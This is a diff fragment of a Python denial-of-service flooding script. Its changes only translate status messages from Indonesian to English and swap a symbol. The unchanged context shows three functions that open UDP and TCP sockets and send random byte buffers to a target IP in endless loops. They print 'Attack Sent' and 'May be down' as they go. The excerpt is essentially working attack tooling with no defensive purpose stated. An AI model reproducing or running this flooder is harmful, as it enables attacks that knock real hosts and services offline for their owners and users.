@@ -87,7 +87,7 @@ time.sleep(5),
 
 def run():
 	data = random._urandom(1024)
-	i = random.choice(("[+]","[*]","[×]","[-]"))
+	i = random.choice(("[+]","[*]","[!]","[-]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -100,7 +100,7 @@ def run():
 
 def run2():
 	data = random._urandom(999)
-	i = random.choice(("[+]","[*]","[×]","[-]"))
+	i = random.choice(("[+]","[*]","[!]","[-]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -108,14 +108,14 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print("[*]  \033[96mPermintaan \033[92mPengiriman Pesan  \033[33m" +ip+ "\033[0m")
+			print("[*]  \033[96mUDP  \033[92mAttack Sent   \033[33m" +ip+ "\033[0m")
 		except:
 			s.close()
 			print("[-]  \033[31mMay be down\033[0m")
 			
 def run3():
 	data = random._urandom(818)
-	i = random.choice(("[+]","[*]","[×]","[-]"))
+	i = random.choice(("[+]","[*]","[!]","[-]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -123,7 +123,7 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print("[#]  \033[32mMemulai Serangan  \033[95mDg target \033[94m" +ip+ "\033[0m")
+			print("[#]  \033[32mHTTP   \033[95mLocked :::...\033[94m" +ip+ "\033[0m")
 		except:
 			s.close()
 			print("[-]  \033[31mMay be down\033[0m")
